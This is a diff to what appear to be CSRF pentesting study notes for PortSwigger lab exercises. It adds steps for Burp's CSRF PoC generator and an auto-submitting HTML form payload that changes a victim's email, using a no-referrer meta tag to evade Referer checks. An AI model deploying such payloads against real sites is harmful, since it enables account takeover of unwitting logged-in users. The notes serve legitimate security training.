@@ -16,6 +16,20 @@ Checklist to test for CSRF:
 - SameSite Strict bypass via client-side redirect
 - SameSite Strict bypass via XSS on sibling domain
 
+## PoC Generator
+[PoC for CSRF](https://portswigger.net/burp/documentation/desktop/testing-workflow/vulnerabilities/session-management/csrf-poc):
+- Right-click the request and select Engagement tools > Generate CSRF PoC. A dialog opens with HTML based on the 
+  selected request.
+- In the HTML, edit the value in the fields you want to change in the PoC attack. For example, the email value in 
+  the change email request.
+- Click Copy HTML to copy the HTML to your clipboard.
+- Paste the HTML into a web page. If you're using the lab, paste the HTML into the exploit server instead.
+- View the web page in a browser that is logged into the vulnerable website.
+- Review the response in your browser and Burp's HTTP history to see whether the desired action occurred. In this 
+  example, the user's email address is successfully updated.
+- To verify the vulnerability, log into the application with a different account. Repeat the attack with the same 
+  HTML. A successful attack confirms that the application is vulnerable to CSRF.
+
 ## LAB payloads
 ```html
 # no defense
@@ -120,6 +134,21 @@ history.pushState('', '', '/?...web-security-academy.net')
 <script>
 document.forms[0].submit();
 </script>
+
+# using PoC Generator - problem is that you may meet "Invalid referer header". then add meta tag to exclude referrer
+<html>
+  <meta name="referrer" content="no-referrer">
+  <body>
+    <form action="https://...web-security-academy.net/my-account/change-email" method="POST">
+      <input type="hidden" name="email" value="t@t.com" />
+      <input type="submit" value="Submit request" />
+    </form>
+    <script>
+      history.pushState('', '', '/');
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
 ```
 
 ### SameSite=Lax bypasses
